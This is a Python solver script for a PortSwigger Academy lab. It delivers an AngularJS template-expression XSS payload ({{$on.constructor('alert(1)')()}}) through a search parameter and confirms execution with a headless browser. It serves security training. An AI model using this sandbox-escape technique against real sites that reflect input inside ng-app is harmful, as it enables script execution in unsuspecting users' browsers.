#!/usr/bin/env python3
"""
DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 11-dom-xss-angularjs-expression.md

What this does:
    The search term is reflected as text inside a <div ng-app> element.
    HTML encoding of angle brackets and quotes is irrelevant here, because
    AngularJS scans the text content of any ng-app-scoped element for
    {{ }} expressions and evaluates them independently of the browser's
    HTML parser. The payload walks from the $on scope method's own
    .constructor chain to the Function constructor to build and invoke
    alert(1) with no HTML syntax at all. Confirms execution with a headless
    browser.

Usage:
    python 11-dom-xss-angularjs-expression.py <lab-url>
    e.g. python 11-dom-xss-angularjs-expression.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install playwright && playwright install chromium
"""

import sys
import urllib.parse
import httpx
from playwright.sync_api import sync_playwright

# $on.constructor resolves to Function; calling it with a string body builds
# a function, and the trailing () invokes it immediately.
PAYLOAD = "{{$on.constructor('alert(1)')()}}"


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")
    session = client.cookies.get("session", "")
    domain = urllib.parse.urlparse(lab_url).netloc

    url = f"{lab_url}/?search={urllib.parse.quote(PAYLOAD)}"
    print(f"[*] Payload: {PAYLOAD}")
    print(f"[*] Delivering to: {url}")

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(3000)
        except Exception:
            pass
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() {'fired' if alert_fired else 'did NOT fire'}")

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
